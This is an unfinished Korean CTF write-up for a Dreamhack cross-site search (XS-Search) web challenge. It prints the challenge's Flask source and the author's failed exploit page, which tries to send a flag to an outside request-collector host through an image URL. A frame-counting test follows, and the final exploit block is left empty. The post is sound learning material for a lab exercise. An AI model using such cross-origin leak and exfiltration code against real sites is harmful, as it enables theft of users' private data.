---
title : Dreamhack - XS Search (Incomplete)
date: 2022-04-26 22:40 +0900
categories: [Dreamhack, Webhacking]
tags: [XS Search, Cross Site Search, Incomplete]
---

## XS - Search
<hr style="border-top: 1px solid;"><br>

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, make_response, redirect, url_for
from selenium.common.exceptions import TimeoutException
from urllib.parse import urlparse
from selenium import webdriver
from hashlib import md5
import urllib
import os

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open("./flag.txt", "r").read()
except:
    FLAG = "[**FLAG**]"

notes = {
    (FLAG, True), 
    ("Hello World", False), 
    ("DreamHack", False), 
    ("carpe diem, quam minimum credula postero", False)
}

def read_url(url, cookie={"name": "name", "value": "value"}):
    cookie.update({"domain": "127.0.0.1"})
    try:
        options = webdriver.ChromeOptions()
        for _ in [
            "headless",
            "window-size=1920x1080",
            "disable-gpu",
            "no-sandbox",
            "disable-dev-shm-usage",
        ]:
            options.add_argument(_)
        driver = webdriver.Chrome("/chromedriver", options=options)
        driver.implicitly_wait(3)
        driver.set_page_load_timeout(3)
        driver.get(url)
    except TimeoutException as e:
        driver.quit()
        return True
    except Exception as e:
        driver.quit()
        # return str(e)
        return False
    driver.quit()
    return True

@app.route("/")
def index():
    return render_template('index.html')


@app.route('/search')
def search():
    query = request.args.get('query', None)
    if query == None:
        return render_template("search.html", query=None, result=None)
    for note, private in notes:
        if private == True and request.remote_addr != "127.0.0.1" and request.headers.get("HOST") != "127.0.0.1:8000":
            continue
        if query != "" and query in note:
            return render_template("search.html", query=query, result=note)
    return render_template("search.html", query=query, result=None)


@app.route("/submit", methods=["GET", "POST"])
def submit():
    if request.method == "GET":
        return render_template("submit.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        if not urlparse(url).scheme.startswith("http"):
            return '<script>alert("wrong url");history.go(-1);</script>'
        if not read_url(url):
            return '<script>alert("wrong??");history.go(-1);</script>'

        return '<script>alert("good");history.go(-1);</script>'


app.run(host="0.0.0.0", port=8000)
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width">
  <title>Exploit</title>
  <link href="style.css" rel="stylesheet" type="text/css" />
</head>

<body>
	<script>
		let img = document.createElement('img');
		let reqbin='https://gwqarqn.request.dreamhack.games';
		function req(url) {
    		let script = document.createElement('script');
    		script.src = url;
    		script.onload = () => {
				let getval = document.querySelector('iframe');
				let Flag = getval.getAttribute('srcdoc');
    			img.setAttribute('src', reqbin+"?flag="+Flag);
			}
			script.onerror = () => img.setAttribute('src', reqbin+'/onerror');
			
			document.head.appendChild(script);
			document.body.appendChild(img);
		}
		req('http://localhost:8000/search?query=D')
	</script>
</body>
	
</html>
```

위와 같이 코드를 짜서 보냈다...

하지만 돌아오는건 스크립트가 로드가 되지 않아 에러가 발생했다는 요청만 올 뿐이었다.

<br>

Link
: <a href="https://security.stackexchange.com/questions/182572/why-cant-bypass-sop-using-src-attribut-in-script-tag" target="_blank">security.stackexchange.com/questions/182572/why-cant-bypass-sop-using-src-attribut-in-script-tag</a>

<br>

스크립트로 로드할 땐, sop 정책때문이 아니라 해당 목표 사이트의 html 코드를 얻을 방법이 없기 때문이라고 한다.
: ```<``` 로 시작하면 script src로 읽을 수가 없다!

<br>

iframe 의 윈도우객체에 접근하기 (contentWindow)
: <a href="https://doolyit.tistory.com/37" target="_blank">doolyit.tistory.com/37</a>

<br>

강의를 보니 frame의 개수로 확인하여 공격을 진행해서 직접 테스트를 해보았고 확인할 수 있었다.

```target.html```에 iframe이 있으면 1, 없으면 0이 console에 출력된다. 

<br>

```html
<!-- target.html -->
<!DOCTYPE html>
<html>
	<head>
		<title>Target</title>
		<meta charset="utf-8">
		<body>
      <iframe srcdoc="<pre>test</pre>"></iframe>
		</body>
	</head>
</html>
```

<br>

```html
<!-- attacker.html -->
<!DOCTYPE html>
<html>
	<head>
		<title>Attacker</title>
		<meta charset="utf-8">
		<body>
			<iframe id="iframe"></iframe>
			<script>
				const iframe = document.getElementById("iframe");
				iframe.src = "https://{repl server}/target.html";
				iframe.onload = () => {
    				console.log(iframe.contentWindow.frames.length);
				};
			</script>
		</body>
	</head>
</html>
```

<br>

내가 궁금했던건 ```그러면 타켓 사이트에 있는 frame의 srcdoc 값을 가져오면 되지 않을까?``` 이였는데, 테스트를 해보니 ```Uncaught DOMException: Blocked a frame with origin <origin> from accessing a cross-origin frame.``` 라는 에러가 떴다.

물론 같은 origin에서는 가져올 수 있었다. 

예를 들면, ```https://test.com```에서 ```https://test.com/test.html```에 있는 ```<iframe srcdoc="<pre>test</pre>"></iframe>``` 코드를 가져오는 건 가능했다.

하지만 실제 공격을 위해서는 내 서버에서 ```http://localhost:8000/search?query=DH```로 공격을 하는 거기 때문에 막힐 것이다.. 

그래서 강의 내용처럼 frame의 개수로 판단하여 공격해야 하는 것 같다..

<br>

```html

```

<br>

<br><br>
<hr style="border: 2px solid;">
<br><br>
